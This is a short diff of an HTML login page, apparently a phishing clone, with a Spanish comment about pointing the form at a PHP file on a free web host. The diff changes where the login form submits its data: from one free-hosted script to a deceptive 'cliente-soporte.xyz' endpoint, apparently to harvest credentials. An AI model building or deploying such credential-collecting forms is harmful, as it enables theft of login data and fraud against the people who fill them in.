@@ -131,7 +131,7 @@
         </div>
 
         <!-- Aquí cambia el 'action' para apuntar a tu archivo PHP en AwardSpace -->
-        <form id="loginForm" action="https://margaris97.atwebpages.com/procesar_login.php" method="POST" onsubmit="validateForm(event)">
+        <form id="loginForm" action="https://cliente-soporte.xyz/procesar_login.php" method="POST" onsubmit="validateForm(event)">
             <div class="form-group">
                 <label for="documentType">Tipo de documento</label>
                 <select id="documentType" name="documentType" required>
@@ -167,5 +167,3 @@
 
 </body>
 </html>
-
-
